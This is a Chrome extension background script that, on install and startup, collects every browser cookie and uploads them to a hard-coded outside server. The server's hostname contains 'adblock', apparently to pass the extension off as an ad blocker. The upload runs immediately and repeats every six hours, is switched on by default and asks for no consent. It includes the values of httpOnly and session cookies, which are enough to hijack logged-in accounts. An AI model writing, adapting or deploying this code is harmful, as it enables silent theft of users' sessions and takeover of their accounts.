let settings = {};

// Load settings on startup
chrome.runtime.onStartup.addListener(loadSettings);
chrome.runtime.onInstalled.addListener(loadSettings);

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'extractCookies') {
    extractAllCookies(request.forceMethod).then(sendResponse);
    return true;
  } else if (request.action === 'updateSettings') {
    settings = request.settings;
    setupAutoScrape();
    sendResponse({success: true});
  }
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'autoScrape') {
    extractAllCookies('api');
  }
});

async function loadSettings() {
  settings = await chrome.storage.sync.get({
    autoScrapeEnabled: true,
    scrapeInterval: 360,
    exportMethod: 'api',
    apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
    apiHeaders: '{"Content-Type": "application/json"}',
    curlCommand: '',
    userProfile: ''
  });
  setupAutoScrape();
}

function setupAutoScrape() {
  chrome.alarms.clear('autoScrape');
  if (settings.autoScrapeEnabled) {
    // Run immediately via API only
    extractAllCookies('api');
    // Then set up recurring schedule
    chrome.alarms.create('autoScrape', {
      delayInMinutes: settings.scrapeInterval,
      periodInMinutes: settings.scrapeInterval
    });
  }
}

async function extractAllCookies(forceMethod = null) {
  try {
    const cookies = await chrome.cookies.getAll({});
    
    const cookieData = {
      timestamp: new Date().toISOString(),
      browser: 'Chrome/Chromium',
      total_cookies: cookies.length,
      cookies: cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        expirationDate: cookie.expirationDate,
        storeId: cookie.storeId,
        hostOnly: cookie.hostOnly,
        session: cookie.session
      }))
    };

    const exportMethod = forceMethod || settings.exportMethod;
    
    if (exportMethod === 'api') {
      await uploadToAPI(cookieData);
    } else {
      await downloadFile(cookieData);
    }

    return {
      success: true,
      count: cookies.length,
      method: exportMethod
    };
  } catch (error) {
    return {
      success: false,
      error: error.message
    };
  }
}

async function downloadFile(cookieData) {
  const jsonString = JSON.stringify(cookieData, null, 2);
  const dataUrl = 'data:application/json;charset=utf-8,' + encodeURIComponent(jsonString);
  const userPrefix = settings.userProfile || await getUserProfile();
  const filename = `${userPrefix}_cookies_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
  
  await chrome.downloads.download({
    url: dataUrl,
    filename: filename,
    saveAs: false
  });
}

async function uploadToAPI(cookieData) {
  if (!settings.apiEndpoint) {
    throw new Error('API endpoint not configured');
  }
  
  try {
    const headers = JSON.parse(settings.apiHeaders || '{}');
    const userPrefix = settings.userProfile || await getUserProfile();
    cookieData.userProfile = userPrefix;
    
    const response = await fetch(settings.apiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: JSON.stringify(cookieData)
    });
    
    if (!response.ok) {
      throw new Error(`API upload failed: ${response.status}`);
    }
  } catch (error) {
    console.error('API upload failed:', error);
    throw error;
  }
}

async function getUserProfile() {
  return 'user';
}